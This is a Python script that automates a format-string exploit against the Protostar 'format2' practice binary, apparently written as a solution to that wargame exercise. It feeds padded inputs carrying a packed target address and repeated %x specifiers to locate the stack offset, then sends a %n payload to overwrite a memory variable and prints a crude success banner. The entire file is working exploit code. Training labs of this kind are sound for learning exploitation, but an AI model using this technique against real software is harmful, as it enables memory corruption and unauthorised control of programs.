import struct, subprocess

target_addr = 0x080496e4
target_val = 0x40 # 64

padding_before = 'A'
padding_after = 'B'

format_strings = ['%8x', '%4x', '%6x', '%2x']

cmd = "/opt/protostar/bin/format2"

def run(args):


        p = subprocess.Popen([cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        p.stdin.write(args)
        p.stdin.close()
        results = p.stdout.read()
        return results

max = 8
min = 4
step = -1

# m = number of padding characters before and after target_addr
for m in range(1, 10, 1):
        for f in format_strings:
                print('[+] Fuzzing: ' + padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f))
                for n in range(max, min, step):

                        results = run(args=padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f) * n + (' %x '))
                        last_result = results.split(' ')[-5:][0]
                        #print("'" + last_result + "'" + ' = ' + hex(target_addr))
                        if last_result == hex(target_addr) or last_result == hex(target_addr)[2:10]:
                                print('    [+] Found match: ' + ' '.join([f, str(m), str(n), last_result]))
                                print('    [+] Attempting exploit...')
                                needle = run(args=padding_before * m + struct.pack("I", target_addr) + padding_after * m + (' ' + f) * n + (' %n '))

                                valid_exploit_results = ['you', 'have', 'modified', 'the', 'target', ':)\n']
                                if needle.split(' ')[-6:] == valid_exploit_results: print('        [!] Fukn B00M! ' + ' '.join(needle.split(' ')[-6:]))
                               
                                                                                       
                                                                                       
